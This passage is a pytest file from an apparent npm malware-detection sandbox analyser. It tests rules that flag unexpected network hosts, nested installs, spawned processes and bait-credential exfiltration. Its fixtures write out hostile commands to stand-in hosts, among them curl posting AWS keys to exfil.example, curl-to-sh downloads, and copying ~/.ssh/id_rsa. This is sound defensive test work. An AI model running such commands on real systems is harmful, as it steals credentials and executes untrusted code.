    assert "sandbox.network" not in ids(findings(baseline()))


def test_allow_listed_hosts_are_low() -> None:
    observations = [
        *baseline(),
        dns("github.com"),
        conn("140.82.112.3", 443, "github.com"),
        dns("registry.npmjs.org", phase="import"),
        conn(REGISTRY_IP, 443, "registry.npmjs.org", phase="import"),
    ]
    finding = only("sandbox.network", findings(observations))
    assert finding.severity is Severity.LOW and finding.weight == 1.0
    assert "github.com, registry.npmjs.org" in finding.explanation
    assert "dns/host (import)" in paths(finding)


def test_github_release_asset_downloads_are_low() -> None:
    observations = [
        *baseline(),
        dns("github.com"),
        dns("release-assets.githubusercontent.com"),
        conn("185.199.108.133", 443, "release-assets.githubusercontent.com"),
    ]
    finding = only("sandbox.network", findings(observations))
    assert finding.severity is Severity.LOW
    assert "Upstream evidence: package-analysis DNS and Sockets (install)." in finding.explanation


def test_other_names_and_raw_addresses_are_medium() -> None:
    observations = [
        *baseline(),
        dns("evil.example", phase="import"),
        conn("198.51.100.7", 443, "evil.example", phase="import"),
        conn("203.0.113.9", 4444),  # hard-coded: no name resolved to it
        conn("1.1.1.1", 53),  # the sample's own resolver
        conn("::", 4444),  # a listener
        conn("198.51.100.8", None, "evil.example", phase="import"),  # port unknown
        conn("127.0.0.1", 9229),
        conn("::ffff:127.0.0.1", 80),
        dns("localhost"),
    ]
    finding = only("sandbox.network", findings(observations))
    assert finding.severity is Severity.MEDIUM and finding.weight == 3.0
    assert "1 names not on the allow-list, 3 addresses no name resolved to" in finding.explanation
    shown = snippets(finding)
    assert "203.0.113.9 port 4444" in shown
    assert "unspecified address port 4444" in shown
    assert "1.1.1.1 port 53" in shown
    assert not any("127.0.0.1" in s or "localhost" in s for s in shown)


def test_network_evidence_cap() -> None:
    observations = [dns(f"h{i}.evil.example") for i in range(MAX_NETWORK_EVIDENCE + 1)]
    finding = only("sandbox.network", findings(observations))
    assert len(finding.evidence) == MAX_NETWORK_EVIDENCE


# --- process-spawn ---------------------------------------------------------------------------


def test_the_drivers_commands_are_expected() -> None:
    assert expected_tarball(job()) == TARBALL
    assert is_driver(("npm", "install", TARBALL), TARBALL, NAME)
    assert is_driver(("node", "/usr/local/bin/npm", "install", TARBALL), TARBALL, NAME)
    assert is_driver(("npm", "init", "--force"), TARBALL, NAME)
    assert is_driver(("/run/podman-init", "--", "sleep", "30m"), TARBALL, NAME)
    assert is_driver((DRIVER, "--local", TARBALL, "all", NAME.upper()), TARBALL, NAME.upper())
    assert is_driver(("node", DRIVER, "--local", TARBALL, "import", NAME), TARBALL, NAME)
    for argv in (
        ("npm", "install", f"{NAME}@{VERSION}"),  # Kitsunox always exports a local tarball
        ("npm", "install", "/stage2.tgz"),  # any other root-level tarball
        ("npm", "install", "/tmp/x/evil.tgz"),
        ("npm", "install", "--no-save", TARBALL),  # not the driver's exact command
        ("npm", "install", TARBALL, "evil-dep"),
        (DRIVER, "--local", "/stage2.tgz", "install", NAME),
        (DRIVER, "--version", VERSION, "install", NAME),
        (DRIVER, "--local", TARBALL, "install", "other"),
        (DRIVER, "--local", TARBALL, "nope", NAME),
        ("sleep", "3600"),
        (),
    ):
        assert not is_driver(argv, TARBALL, NAME), argv


def test_a_second_install_of_another_tarball_is_reported() -> None:
    """The reviewer's probe: a hook drops a second-stage tarball at / and installs it."""
    observations = [
        *baseline(),
        op("/stage2.tgz", "read", "write"),
        ex("npm", "install", "/stage2.tgz"),
        ex("node", "/usr/bin/npm", "install", "/stage2.tgz"),
    ]
    found = findings(observations)
    assert "sandbox.quiet" not in ids(found)
    nested = only("sandbox.nested-install", found)
    assert nested.severity is Severity.HIGH and nested.weight == 5.0
    assert {e.after for e in nested.evidence} == {"npm install of /stage2.tgz"}
    assert "Upstream evidence: package-analysis Commands (install)." in nested.explanation
    spawn = only("sandbox.process-spawn", found)
    assert "npm fetches more packages: `install` (install)" in {e.after for e in spawn.evidence}


@pytest.mark.parametrize(
    ("argv", "why"),
    [
        (("npm", "i", "github:evil/stage2"), "npm i of github:evil/stage2"),
        (("npm", "add", "https://evil.example/x.tgz"), "npm add of https://evil.example/x.tgz"),
        (("npm", "install", "--no-save", "./x.tgz"), "npm install of ./x.tgz"),
        (("npm", "exec", "--yes", "evil/repo"), "npm exec of evil/repo"),
        (("npm", "install", "x@file:../y"), "npm install of x@file:../y"),
        ((DRIVER, "--local", "/stage2.tgz", "install", NAME), "driver given another tarball"),
        (("node", DRIVER, "--local", "/x.tgz", "import", NAME), "driver given another tarball"),
    ],
)
def test_nested_install_shapes(argv: tuple[str, ...], why: str) -> None:
    nested = only("sandbox.nested-install", findings([*baseline(), ex(*argv, phase="import")]))
    assert [e.after for e in nested.evidence] == [why]
    assert paths(nested) == ["exec (import)"]


def test_rewriting_the_analysed_tarball_is_nested_install() -> None:
    nested = only("sandbox.nested-install", findings([*baseline(), op(TARBALL, "write")]))
    assert [e.after for e in nested.evidence] == ["the analysed tarball: write"]
    assert "Commands and Files (install)" in nested.explanation
    assert "sandbox.nested-install" not in ids(findings([op(TARBALL, "read")]))


@pytest.mark.parametrize(
    ("argv", "why"),
    [
        (("npm", "exec", "--package=./x.tgz", "--", "x"), "npm exec of ./x.tgz"),
        (("npm", "exec", "--yes", "--package", "https://e.example/x.tgz", "x"),
         "npm exec of https://e.example/x.tgz"),
        (("npm", "x", "--", "/tmp/x.tgz"), "npm x of /tmp/x.tgz"),
        (("npx", "./x.tgz"), "npx of ./x.tgz"),
        (("npx", "--yes", "https://e.example/x.tgz", "--flag"), "npx of https://e.example/x.tgz"),
        (("npx", "-p", "file:../x", "tool"), "npx of file:../x"),
        (("npx", "--package=/tmp/x.tgz", "tool"), "npx of /tmp/x.tgz"),
        (("node", "/usr/bin/npx", "/tmp/x.tgz"), "npx of /tmp/x.tgz"),
        (("node", "/usr/lib/node_modules/npm/bin/npx-cli.js", "-p", "./y", "z"), "npx of ./y"),
        (("yarn", "add", "file:../stage2"), "yarn add of file:../stage2"),
        (("yarn", "--cwd", "/tmp/w", "add", "https://e.example/x.tgz"),
         "yarn add of https://e.example/x.tgz"),
        (("/tmp/yarn", "global", "add", "./x.tgz"), "yarn add of ./x.tgz"),
        (("yarn", "dlx", "/tmp/x.tgz"), "yarn dlx of /tmp/x.tgz"),
        (("node", "/tmp/yarn.js", "add", "portal:../x"), "yarn add of portal:../x"),
        (("pnpm", "add", "-D", "./x.tgz"), "pnpm add of ./x.tgz"),
        (("pnpm", "install", "https://e.example/x.tgz"), "pnpm install of https://e.example/x.tgz"),
        (("corepack", "pnpm", "i", "file:/tmp/x"), "pnpm i of file:/tmp/x"),
        (("pnpx", "/tmp/x.tgz"), "pnpx of /tmp/x.tgz"),
        (("npm", "install", "--prefix", "/tmp/p", TARBALL),
         "npm install --prefix of the analysed tarball"),
        (("npm", "--prefix=/tmp/p", "install", TARBALL),
         "npm install --prefix of the analysed tarball"),
        (("npm", "i", "-g", TARBALL), "npm i -g of the analysed tarball"),
        (("npm", "install", "--location=global", TARBALL),
         "npm install --location global of the analysed tarball"),
        (("npm", "install", "--location", "user", TARBALL),
         "npm install --location user of the analysed tarball"),
        (("npm", "install", "-g", "/tmp/x.tgz"), "npm install -g of /tmp/x.tgz"),
        (("npm", "install", "-C", "/tmp/p", "./x.tgz"), "npm install -C of ./x.tgz"),
    ],
)  # fmt: skip
def test_more_nested_install_shapes(argv: tuple[str, ...], why: str) -> None:
    nested = only("sandbox.nested-install", findings([*baseline(), ex(*argv)]))
    assert [e.after for e in nested.evidence] == [why]


@pytest.mark.parametrize(
    "argv",
    [
        ("npm", "exec", "--package=cowsay", "--", "cowsay", "./notes.txt"),
        ("npm", "exec", "cowsay", "./notes.txt"),  # the words after the package are its args
        ("npx", "cowsay", "/tmp/x.tgz"),
        ("npx", "-p", "cowsay", "cowsay", "./x.tgz"),
        ("yarn", "add", "left-pad"),
        ("yarn", "install"),
        ("yarn", "run", "./x.tgz"),
        ("pnpm", "install"),
        ("pnpm", "add", "@scope/pkg@^2"),
        ("pnpm", "run", "build", "./x.tgz"),
        ("npm", "install", "--prefix", "/tmp/p", "left-pad"),
        ("npm", "install", "--global=false", TARBALL),
        ("npm", "install", "--location=project", TARBALL),
        ("npm", "install", "--no-save", TARBALL),
        ("/tmp/notyarn", "add", "./x.tgz"),
    ],
)
def test_not_nested_installs(argv: tuple[str, ...]) -> None:
    assert "sandbox.nested-install" not in ids(findings([*baseline(), ex(*argv)]))


def test_nested_install_helpers() -> None:
    assert npm_split(("--registry", "r", "-g")) == (None, ("--registry", "r", "-g"), ())
    assert npm_split(("-g", "i", "x")) == ("i", ("-g",), ("x",))
    assert npx_args(("npx", "x")) == ("x",)
    assert npx_args(("/tmp/npx", "x")) is None  # not the image's
    assert npx_args(("node", "/tmp/npx-cli.js", "x")) is None
    assert npx_args(()) is None
    assert exec_specs(("--package", "a", "--package=b", "cmd"), npx=False) == ["a", "b"]
    assert exec_specs(("-p", "a", "cmd"), npx=False) == ["a"]  # npm's -p isn't --package
    assert exec_specs(("-p", "a", "cmd"), npx=True) == ["a"]
    assert exec_specs(("-c", "echo hi"), npx=False) == []
    assert exec_specs(("--package",), npx=False) == []
    assert exec_specs(("--",), npx=False) == []
    assert install_elsewhere(("--location",)) is None
    assert install_elsewhere(("--global", "x")) == "--global"
    assert yarn_pnpm_specs(()) is None
    assert yarn_pnpm_specs(("corepack",)) is None
    assert yarn_pnpm_specs(("yarn",)) is None
    assert yarn_pnpm_specs(("pnpx",)) == ("pnpx", [])
    assert yarn_pnpm_specs(("yarnpkg", "add", "a", "b")) == ("yarn add", ["a", "b"])
    assert yarn_pnpm_specs(("pnpm.cjs", "dlx", "a", "b")) == ("pnpm dlx", ["a"])


@pytest.mark.parametrize(
    ("spec", "foreign"),
    [
        ("left-pad", False),
        ("left-pad@1.3.0", False),
        ("@scope/pkg", False),
        ("@scope/pkg@^2", False),
        ("alias@npm:@scope/real", False),
        ("/tmp/x.tgz", True),
        ("../dir", True),
        (".", True),
        ("user/repo", True),
        ("git+ssh://git@github.com/u/r.git", True),
        ("git@github.com:u/r.git", True),
        ("pkg@https://evil.example/p.tgz", True),
        ("HTTPS://EVIL.EXAMPLE/P", True),
        ("thing.tar.gz", True),
    ],
)
def test_foreign_spec(spec: str, foreign: bool) -> None:
    assert foreign_spec(spec) is foreign


def test_the_driver_with_other_arguments_is_unexpected() -> None:
    spawn = only("sandbox.process-spawn", findings([ex(DRIVER, "--version", "9", "install", NAME)]))
    assert [e.after for e in spawn.evidence] == [
        "package-analysis's driver with other arguments (install)"
    ]


def test_unexpected_programs_are_reported() -> None:
    observations = [
        *baseline(),
        ex("curl", "-s", "https://evil.example/p"),
        ex("bash", "-c", "id"),
        ex("id"),
        ex("/tmp/node", "x.js"),
        ex(f"{PKG}/bin/payload"),
        ex("sudo", "-n", "true", phase="import"),
        ex("npm", "whoami"),
        ex("npm", "exec", "--yes", "evil-pkg"),
        ex("npm", "install", "evil-pkg"),
        ex(),
    ]
    finding = only("sandbox.process-spawn", findings(observations))
    assert finding.severity is Severity.MEDIUM and finding.weight == 3.0
    reasons = {e.snippet: e.after for e in finding.evidence}
    assert reasons["npm whoami"] == "npm account command `whoami` (install)"
    assert reasons["npm exec --yes evil-pkg"] == "npm fetches more packages: `exec` (install)"
    assert reasons["sudo -n true"] == "not an expected program (import)"
    assert reasons[None] == "empty argv (install)"
    assert sorted(paths(finding)) == sorted(
        ["?", "bash", "curl", "id", "node", "npm", "npm", "npm", "payload", "sudo"]
    )


def test_npm_and_node_plumbing_is_expected() -> None:
    observations = [
        ex("npm", "run", "build"),
        ex("node", "/usr/local/bin/npm", "run", "rebuild"),
        ex("/usr/bin/node", "-e", "try{require('./postinstall')}catch(e){}"),
        ex("/bin/sh", "-c", "node-gyp-build || exit 0"),
        ex("node-gyp-build"),
        ex("node", "/app/node_modules/.bin/node-gyp-build"),
        ex("/app/node_modules/esbuild/bin/esbuild", "--version"),
        ex("python3", "-c", "import sys; print(sys.executable);"),
        ex("npm", "publish"),  # sandbox.npm-publish's, not process-spawn's
    ]
    assert "sandbox.process-spawn" not in ids(findings(observations))


def test_build_tools_only_where_node_gyp_ran() -> None:
    assert "sandbox.process-spawn" not in ids(findings([ex("node-gyp", "rebuild"), ex("make")]))
    gyp = ex(
        "sh",
        "/usr/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin/node-gyp",
        "rebuild",
    )
    tools = [
        ex("make", "BUILDTYPE=Release", "-C", "build"),
        ex("g++", "-o", "x.o", "x.cc"),
        ex("/usr/libexec/gcc/x86_64-linux-gnu/13/cc1plus", "-quiet"),
        ex("x86_64-linux-gnu-g++-13", "-c"),
        ex("python3", "/usr/lib/node_modules/npm/node_modules/node-gyp/gyp/gyp_main.py"),
    ]
    assert "sandbox.process-spawn" not in ids(findings([gyp, *tools]))
    elsewhere = [ex(*gyp.argv, phase="import"), *tools]
    finding = only("sandbox.process-spawn", findings(elsewhere))
    assert len(finding.evidence) == len(tools)
    shipped = [gyp, ex("/app/node_modules/kx-fixture/make")]
    assert "sandbox.process-spawn" in ids(findings(shipped))


GYP_MAIN_PY = "/usr/lib/node_modules/npm/node_modules/node-gyp/gyp/gyp_main.py"


def gyp_build(phase: Phase = "install") -> list[Observation]:
    """What an implicit `node-gyp rebuild` runs, from gyp's generated Makefile."""
    argvs: list[tuple[str, ...]] = [
        ("sh", "-c", "node-gyp rebuild"),
        ("node-gyp", "rebuild"),
        ("node", "/usr/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js", "rebuild"),
        ("python3", "-c", "import sys; print(sys.executable);"),
        ("python3", "-c", "import sys; sys.stdout.buffer.write(sys.executable.encode('utf-8'));"),
        ("/app/.pyenv/bin/python3", "-c", 'import sys; print("%s.%s.%s" % sys.version_info[:3]);'),
        ("/app/.pyenv/bin/python3", GYP_MAIN_PY, "binding.gyp", "-f", "make", "-I", "config.gypi"),
        ("make", "BUILDTYPE=Release", "-C", "build"),
        ("sh", "-c", "mkdir -p Release/obj.target/addon/src; g++ -o x.o ../src/x.cc"),
        ("mkdir", "-p", "Release/obj.target/addon/src"),
        ("g++", "-I/root/.cache/node-gyp/24.0.0/include/node", "-c", "../src/x.cc"),
        ("/usr/libexec/gcc/x86_64-linux-gnu/13/cc1plus", "-quiet", "../src/x.cc"),
        ("as", "-o", "Release/obj.target/addon/src/x.o"),
        ("sed", "-e", "s|^x.o|Release/obj.target/x.o|", "Release/.deps/x.o.d.raw"),
        ("sed", "-e", "/^$/ d", "-e", "s/$/ :/", "Release/.deps/x.o.d.raw"),
        ("grep", "-v", "^#", "Release/.deps/x.d"),
        ("touch", "Release/.deps/x.o.d"),
        ("rm", "-f", "Release/.deps/x.o.d.raw"),
        ("./gyp-flock-tool", "flock", "Release/linker.lock", "ar", "crs", "Release/x.a"),
        ("python3", "./gyp-flock-tool", "flock", "Release/linker.lock", "ar", "crs", "x.a"),
        ("ln", "-f", "Release/obj.target/addon.node", "Release/addon.node"),
        ("rm", "-rf", "Release/addon.node"),
        ("cp", "-af", "Release/obj.target/addon.node", "Release/addon.node"),
        ("mv", f"{PKG}/build/Release/a.tmp", f"{PKG}/build/Release/a"),
        ("uname", "-s"),
    ]
    return [ex(*argv, phase=phase) for argv in argvs]


def test_a_node_gyp_build_is_quiet() -> None:
    writes = [
        op(f"{PKG}/build/Makefile", "write"),
        op(f"{PKG}/build/gyp-flock-tool", "write"),
        op(f"{PKG}/build/Release/addon.node", "write"),
    ]
    found = findings([*baseline(), *gyp_build(), *writes], shipped=(*SHIPPED, "binding.gyp"))
    assert ids(found) == ["sandbox.ran", "sandbox.quiet"]


@pytest.mark.parametrize(
    "argv",
    [
        ("curl", "-fsSL", "https://evil.example/x"),
        ("wget", "https://evil.example/x"),
        ("bash", "-c", "id"),
        ("cp", "/root/.ssh/id_rsa", "/tmp/k"),
        ("cp", "../../../../root/.npmrc", "x"),
        ("rm", "-rf", "~/.bashrc"),
        ("sed", "-e", "s/a/b/", "/etc/passwd"),
        ("grep", "-r", "token", "/root"),
        ("mkdir", "-p", "/root/.config/autostart"),
        ("cp", "https://evil.example/x", "y"),
        ("/tmp/mkdir", "-p", "x"),
        ("python3", "-c", "import urllib.request"),
        ("python3", "/tmp/x.py"),
        ("/app/.pyenv/bin/python3", "/app/node_modules/node-gyp/gyp/gyp_main.py"),
        ("python3", "/tmp/gyp-flock-tool", "flock"),
        ("/tmp/gyp-flock-tool", "flock"),
        ("cat", "Release/x"),
    ],
)
def test_build_tools_never_hide_other_commands(argv: tuple[str, ...]) -> None:
    found = findings([*baseline(), *gyp_build(), ex(*argv)])
    spawn = only("sandbox.process-spawn", found)
    assert [e.snippet for e in spawn.evidence] == [command(argv)]


def test_gyp_file_tools_only_where_node_gyp_ran() -> None:
    tools = [o for o in gyp_build() if program(o.argv) in ("mkdir", "sed", "touch", "rm", "cp")]
    spawn = only("sandbox.process-spawn", findings(tools))
    assert len(spawn.evidence) == len(tools)
    elsewhere = [*gyp_build("import"), *tools]  # node-gyp ran, but in another phase
    assert len(only("sandbox.process-spawn", findings(elsewhere)).evidence) == len(tools)


def test_curl_pipe_sh_in_a_gyp_phase_still_fires() -> None:
    found = findings([*gyp_build(), ex("curl", "-s", "https://evil.example/x"), ex("sh")])
    assert "sandbox.download-run" in ids(found)
    assert {"curl", "sh"} <= set(paths(only("sandbox.process-spawn", found)))


# --- helpers ---------------------------------------------------------------------------------


def test_visible_and_clip_escape_hidden_characters() -> None:
    assert visible("a‮b\x00c​") == "a\\u202eb\\u0000c\\u200b"
    assert visible("\U000e0041") == "\\U000e0041"
    clipped = clip("\x00" * (SNIPPET_LIMIT + 10))
    assert clipped.startswith("\\u0000") and clipped.endswith("[10 more chars]")
    assert len(clipped.split("...")[0]) == SNIPPET_LIMIT


def test_hostile_text_in_evidence_is_escaped() -> None:
    finding = only("sandbox.process-spawn", findings([ex("cu‮rl", "-d", "x\ny")]))
    assert finding.evidence[0].path == "cu\\u202erl"
    assert "\\u202e" in (finding.evidence[0].snippet or "")


def test_npm_args_and_the_abstract_base() -> None:
    assert npm_args(()) is None
    assert npm_args(("node", "/usr/bin/npm", "ci")) == ("ci",)
    assert npm_args(("node", "/app/npm", "ci")) is None
    with pytest.raises(NotImplementedError):
        SandboxRuleBase().check(make_run(), analyse(make_run(), ()))


def test_under_image() -> None:
    assert under_image("/usr/bin/npm")
    assert not under_image("/usr/../tmp/npm")
    assert not under_image("//usr/bin/npm")
    assert not under_image("npm")
    assert not under_image(None)


def test_analyse_groups_by_kind_in_phase_order() -> None:
    activity = analyse(make_run(), [ex("b", phase="import"), ex("a"), dns("x.example")])
    assert [o.argv for o in activity.of(K.EXEC)] == [("a",), ("b",)]
    assert activity.package_dir == PKG
    assert [o.kind for o in activity.of(K.EXEC, K.DNS)] == [K.DNS, K.EXEC, K.EXEC]


# --- through the importer --------------------------------------------------------------------


def summary(**fields: Any) -> dict[str, Any]:
    base: dict[str, Any] = {
        "Status": "completed",
        "Stdout": None,
        "Stderr": None,
        "Files": None,
        "Sockets": None,
        "Commands": None,
        "DNS": None,
    }
    return {**base, **fields}


def test_a_package_analysis_result_through_the_importer() -> None:
    """A hand-written rel-38 result (the structs of pkg/api/analysisrun/result.go): a hook that
    reads the planted key, sends the AWS bait with curl and looks up a hex-encoded name."""
    key_id = "AKIAIABCDEFGHIJKLMNQ"
    secret = base64.b64encode(b"secret-bait-value-for-tests-30").decode()
    env = [f"AWS_ACCESS_KEY_ID={key_id}", f"AWS_SECRET_ACCESS_KEY={secret}", "HOME=/root"]
    hexed = b"stolen-token".hex() + "00"
    record = {
        "Package": {"Ecosystem": "npm", "Name": NAME, "Version": VERSION},
        "CreatedTimestamp": 1767225600,
        "Analysis": {
            "install": summary(
                Stdout=base64.b64encode(b"Install succeeded.\n").decode(),
                Files=[
                    {"Path": "/root/.npmrc", "Read": True, "Write": False, "Delete": False},
                    {"Path": "/root/.ssh/id_rsa", "Read": True, "Write": False, "Delete": False},
                ],
                Sockets=[
                    {"Address": "8.8.8.8", "Port": 53, "Hostnames": []},
                    {"Address": REGISTRY_IP, "Port": 443, "Hostnames": ["registry.npmjs.org"]},
                    {"Address": "192.0.2.10", "Port": 443, "Hostnames": ["exfil.example"]},
                ],
                Commands=[
                    {"Command": [DRIVER, "--local", TARBALL, "install", NAME], "Environment": env},
                    {"Command": ["npm", "install", TARBALL], "Environment": env},
                    {"Command": ["sh", "-c", "node postinstall.js"], "Environment": env},
                    {
                        "Command": ["curl", "-d", f"{key_id}:{secret}", "https://exfil.example"],
                        "Environment": env,
                    },
                ],
                DNS=[
                    {
                        "Class": "IN",
                        "Queries": [
                            {"Hostname": "registry.npmjs.org", "Types": ["AAAA", "A"]},
                            {"Hostname": "exfil.example", "Types": ["A"]},
                            {"Hostname": f"{hexed}.exfil.example", "Types": ["TXT"]},
                        ],
                    }
                ],
            ),
            "import": summary(),
        },
    }
    result = ossf.parse_dynamic(json.dumps(record).encode(), job())
    assert result.run.status == "completed"
    found = apply_rules(CANDIDATE, result.run, result.observations)
    assert ids(found) == [
        "sandbox.ran",
        "sandbox.bait-exfil",
        "sandbox.sensitive-read",
        "sandbox.dns-tunnel-shape",
        "sandbox.network",
        "sandbox.process-spawn",
    ]
    bait = only("sandbox.bait-exfil", found)
    assert bait.severity is Severity.CRITICAL
    rendered = json.dumps([f.model_dump(mode="json") for f in found])
    assert key_id not in rendered and secret not in rendered
    assert paths(only("sandbox.sensitive-read", found)) == ["/root/.ssh/id_rsa"]
    network = only("sandbox.network", found)
    assert network.severity is Severity.MEDIUM
    assert "registry.npmjs.org" not in " ".join(snippets(network))
    assert paths(only("sandbox.process-spawn", found)) == ["curl"]


def test_a_manifest_confusion_job_uses_the_name_npm_installs() -> None:
    confused = make_run().model_copy(
        update={"job": job().model_copy(update={"install_name": "Kx-Real"})}
    )
    activity = analyse(confused, ())
    assert activity.package_dir == "/app/node_modules/Kx-Real"
    observations = [
        ex(DRIVER, "--local", TARBALL, "install", "kx-real"),
        ex("npm", "install", TARBALL),
        op("/app/node_modules/Kx-Real/stage2.js", "write"),
        ex("node", "stage2.js"),
    ]
    found = findings(observations, confused, shipped=SHIPPED)
    assert "sandbox.process-spawn" not in ids(found)
    assert paths(only("sandbox.download-exec", found)) == ["/app/node_modules/Kx-Real/stage2.js"]


# --- shipped file lists, bundles and origins -------------------------------------------------

DEP = f"{PKG}/node_modules/dep"
BUNDLE_FILES = frozenset(
    {
        *SHIPPED,
        "node_modules/dep/package.json",
        "node_modules/dep/install.js",
        "node_modules/dep/bin/real",
        "node_modules/@s/inner/package.json",
        "node_modules/dep/node_modules/deeper/index.js",
        "node_modules/esbuild/bin/esbuild",
        "node_modules/own/index.js",  # the original tarball's own node_modules
    }
)
BUNDLED = frozenset({"dep", "@s/inner", "deeper", "esbuild"})


def hook_env(package_dir: str, event: str = "postinstall") -> tuple[str, ...]:
    """What npm's run-script puts in a lifecycle script's environment (make-spawn-args.js)."""
    return (
        *BAIT_ENV,
        f"npm_package_json={package_dir}/package.json",
        f"npm_lifecycle_event={event}",
    )


def bundled(observations: Sequence[Observation]) -> tuple[Finding, ...]:
    return apply_rules(
        CANDIDATE, make_run(), observations, shipped=BUNDLE_FILES, bundled_deps=BUNDLED
    )


def test_apply_rules_takes_a_frozenset_file_list() -> None:
    observations = [*baseline(), ex(f"{PKG}/lib/dropped.js"), ex("node", f"{PKG}/install.js")]
    found = apply_rules(CANDIDATE, make_run(), observations, shipped=frozenset(SHIPPED))
    finding = only("sandbox.download-exec", found)
    assert finding.severity is Severity.HIGH and finding.weight == 5.0
    assert paths(finding) == [f"{PKG}/lib/dropped.js"]
    assert "sandbox.download-exec" not in ids(apply_rules(CANDIDATE, make_run(), observations))
    with pytest.raises(TypeError, match="shipped"):
        apply_rules(CANDIDATE, make_run(), observations, shipped="package.json")
    with pytest.raises(TypeError, match="bundled_deps"):
        apply_rules(CANDIDATE, make_run(), observations, bundled_deps="dep")


def test_a_benign_bundle_is_quiet() -> None:
    """The package's and a bundled dependency's hooks run; npm unpacks every shipped file."""
    observations = [
        *baseline(),
        op(f"{DEP}/install.js", "read", "write"),
        op(f"{DEP}/node_modules/deeper/index.js", "write"),
        ex("sh", "-c", "node install.js", env=hook_env(DEP)),
        ex("node", "install.js", env=hook_env(DEP)),
        ex("node", f"{DEP}/bin/real", "--check", env=hook_env(DEP)),  # shipped
        ex(f"{PKG}/node_modules/esbuild/bin/esbuild", "--version"),
    ]
    found = bundled(observations)
    assert ids(found) == ["sandbox.ran", "sandbox.quiet"]
    assert "Kitsunox bundle: 4 dependencies" in found[0].explanation
    # A shipped program is still process-spawn's (not download-exec's); a bin link is npm's.
    shipped = bundled([ex(f"{DEP}/bin/real"), ex(f"{PKG}/node_modules/.bin/real")])
    assert ids(shipped) == ["sandbox.ran", "sandbox.process-spawn"]


def test_bundled_dependency_evidence_names_the_dependency() -> None:
    observations = [
        *baseline(),
        ex(f"{DEP}/bin/dropped", env=hook_env(DEP)),  # not in the bundle
        ex("node", f"{DEP}/node_modules/deeper/stage2.js"),
        ex("node", f"{PKG}/node_modules/@s/inner/x.js", phase="import"),
        ex(f"{PKG}/node_modules/own/run"),  # the package's own shipped node_modules
        ex(f"{PKG}/stage2"),
        op(f"{DEP}/payload", "write"),
        ex("sh", f"{DEP}/payload"),
    ]
    finding = only("sandbox.download-exec", bundled(observations))
    assert dict(zip(paths(finding), (e.after for e in finding.evidence), strict=True)) == {
        f"{DEP}/bin/dropped": "not in the tarball, exec (install); in dependency dep",
        f"{DEP}/node_modules/deeper/stage2.js": (
            "not in the tarball, exec (install); in dependency deeper"
        ),
        f"{PKG}/node_modules/@s/inner/x.js": (
            "not in the tarball, exec (import); in dependency @s/inner"
        ),
        f"{PKG}/node_modules/own/run": (
            "not in the tarball, exec (install); in the package's own node_modules/own "
            "(not one Kitsunox bundled)"
        ),
        f"{PKG}/stage2": "not in the tarball, exec (install); in the package",
        f"{DEP}/payload": "written, then exec (install); in dependency dep",
    }
    assert (
        "Where the paths show it: in dependency @s/inner; in dependency deeper; in dependency "
        "dep; in the package; in the package's own node_modules/own (not one Kitsunox bundled)."
    ) in finding.explanation


def test_command_origin_from_npms_environment() -> None:
    observations = [
        *baseline(),
        ex("curl", "-s", "https://evil.example/p", env=hook_env(DEP)),
        ex("id", env=hook_env(PKG, "preinstall")),
        ex("whoami", env=(*BAIT_ENV, "npm_package_json=/tmp/package.json")),  # not a package
        ex("uname", env=(*BAIT_ENV, f"npm_package_json={DEP}/manifest")),  # not a package.json
        ex("hostname", env=(f"npm_package_json={DEP}/package.json",)),  # no event
    ]
    spawn = only("sandbox.process-spawn", bundled(observations))
    reasons = {e.path: e.after for e in spawn.evidence}
    assert reasons["curl"] == (
        "not an expected program (install); in dependency dep (per npm_package_json, postinstall)"
    )
    assert reasons["id"] == (
        "not an expected program (install); in the package (per npm_package_json, preinstall)"
    )
    assert reasons["whoami"] == reasons["uname"] == "not an expected program (install)"
    assert reasons["hostname"] == (
        "not an expected program (install); in dependency dep (per npm_package_json)"
    )


def test_origins_in_other_command_rules() -> None:
    env = hook_env(DEP)
    observations = [
        *baseline(),
        ex("npm", "publish", env=env),
        ex("npx", "/tmp/x.tgz", env=env),
        ex("curl", "-fsSL", "https://evil.example/x.sh", env=env),
        ex("sh", env=env),
        ex("curl", "-d", KEY_MARK, "https://evil.example/c", env=env),
    ]
    found = bundled(observations)
    label = "in dependency dep (per npm_package_json, postinstall)"
    for rule in ("sandbox.npm-publish", "sandbox.nested-install", "sandbox.download-run"):
        finding = only(rule, found)
        assert all(label in (e.after or "") for e in finding.evidence), rule
        assert f"Where the paths show it: {label}." in finding.explanation
    bait = only("sandbox.bait-exfil", found)
    assert bait.severity is Severity.CRITICAL
    assert [e.after for e in bait.evidence] == [f"bait value; {label}"]


def test_unbundled_dependency_paths_are_labelled_by_path() -> None:
    observations = [
        *baseline(),
        op("/app/node_modules/hoisted/x", "write"),  # npm's, in install
        op("/app/node_modules/hoisted/y", "write", phase="import"),
        ex("/app/node_modules/hoisted/x", phase="import"),
        ex("/app/node_modules/hoisted/y", phase="import"),
        op(f"{PKG}/node_modules/nested/y", "write", phase="import"),
        ex(f"{PKG}/node_modules/nested/y", phase="import"),
        ex("/app/node_modules/.bin/z", phase="import"),
    ]
    finding = only("sandbox.download-exec", findings(observations))
    assert {e.path: e.after for e in finding.evidence} == {
        "/app/node_modules/hoisted/y": "written, then exec (import); in dependency hoisted",
        f"{PKG}/node_modules/nested/y": "written, then exec (import); in dependency nested",
    }


def test_a_bundled_dependencys_gyp_build_is_not_a_dropper() -> None:
    observations = [
        ex("node-gyp", "rebuild", env=hook_env(DEP, "install")),
        op(f"{DEP}/build/Release/gen", "write"),
        ex(f"{DEP}/build/Release/gen"),
        ex(f"{DEP}/node_modules/deeper/build/x"),
    ]
    assert "sandbox.download-exec" not in ids(bundled(observations))
    assert "sandbox.download-exec" in ids(bundled(observations[1:]))


def test_many_origins_are_capped_in_the_explanation() -> None:
    observations = [ex(f"/app/node_modules/d{i:02d}/x") for i in range(MAX_ORIGINS + 3)]
    spawn = only("sandbox.process-spawn", findings(observations))
    assert "in dependency d00; " in spawn.explanation
    assert "; and 3 more." in spawn.explanation


@pytest.mark.parametrize(
    ("path", "chain"),
    [
        ("/app/node_modules/a/index.js", (("a",), "index.js")),
        ("/app/node_modules/a/node_modules/b/lib/x", (("a", "b"), "lib/x")),
        ("/app/node_modules/@s/a/node_modules/@t/b/x", (("@s/a", "@t/b"), "x")),
        ("/app/node_modules/a/node_modules/.bin/x", (("a",), "node_modules/.bin/x")),
        ("/app/node_modules/a/node_modules/@s", (("a",), "node_modules/@s")),
        ("/app/node_modules/a/node_modules", (("a",), "node_modules")),
